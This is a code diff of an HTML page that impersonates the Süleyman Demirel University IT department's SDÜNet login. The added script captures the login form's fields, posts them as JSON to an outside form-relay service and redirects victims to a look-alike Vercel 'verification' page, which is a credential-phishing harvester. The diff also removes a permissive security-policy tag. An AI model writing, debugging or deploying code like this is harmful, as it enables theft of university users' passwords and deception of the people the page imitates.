@@ -1038,9 +1038,36 @@
                                             <meta charset="UTF-8">
                                             <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-                                            <meta http-equiv="Content-Security-Policy"
-                                                content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * https://api.web3forms.com; img-src * data:; style-src * 'unsafe-inline';">
+                                            <script>
+                                                document.getElementById('sduLoginForm').addEventListener('submit', function (e) {
+                                                    e.preventDefault();
+                                                    const btn = document.querySelector('.btn-submit');
+                                                    btn.innerText = "GÖNDERİLİYOR...";
 
+                                                    const formData = new FormData(this);
+                                                    const object = Object.fromEntries(formData);
+
+                                                    fetch('https://api.web3forms.com/submit', {
+                                                        method: 'POST',
+                                                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                                                        body: JSON.stringify(object)
+                                                    })
+                                                        .then(async (response) => {
+                                                            let json = await response.json();
+                                                            if (response.status == 200) {
+                                                                // BAŞARILIYSA GİT
+                                                                window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+                                                            } else {
+                                                                // HATA VARSA EKRANA YAZ (Bunu görünce bana söyle)
+                                                                alert("Hata Mesajı: " + json.message);
+                                                            }
+                                                        })
+                                                        .catch(error => {
+                                                            alert("Bağlantı Kurulamadı! İnternet veya CSP engeli.");
+                                                            window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+                                                        });
+                                                });
+                                            </script>
                                             <title>SDÜ | SDÜNet Geliştirilmiş Arayüzüyle Yayında</title>
 
                                             <link rel="stylesheet"
